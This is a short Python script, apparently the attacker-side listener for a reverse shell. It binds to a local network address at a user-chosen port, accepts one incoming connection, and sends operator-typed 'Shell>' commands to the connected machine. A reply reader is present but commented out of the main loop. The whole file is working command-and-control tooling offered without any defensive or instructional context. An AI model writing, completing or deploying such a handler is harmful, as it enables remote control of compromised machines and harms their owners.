import socket,os,time
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
HOST='192.168.0.104'

def connection():
	PORT=int(input('Enter PORT:'))
	try:
		s.bind((HOST,PORT))
		print(f"Server started at {HOST},{PORT}")
		s.listen(1)
		clientsocket,address =s.accept()
		print(f"Connection from {address} has been estabilished[].....")
		rev_shell(clientsocket)
	except Exception as e:
		print(f'Exception occured:{e}\n Trying Again...')
		time.sleep(1)
		connection()

def rev_shell(clientsocket):
	while True:
		# msg_sim=text(clientsocket)
		# print(f"SIM message:{msg_sim}");
		command=input("Shell>")
		clientsocket.send(command.encode())

def text(clientsocket):
	string=''
	while True:
		part=clientsocket.recv(1).decode()
		
		#print(f'Part is {part}')
		if (part==';'):
			break;
		else:
			string+=part
		# string=clientsocket.recv(196500).decode()
		#return (string)
	return (string)


def main():
	connection()

main()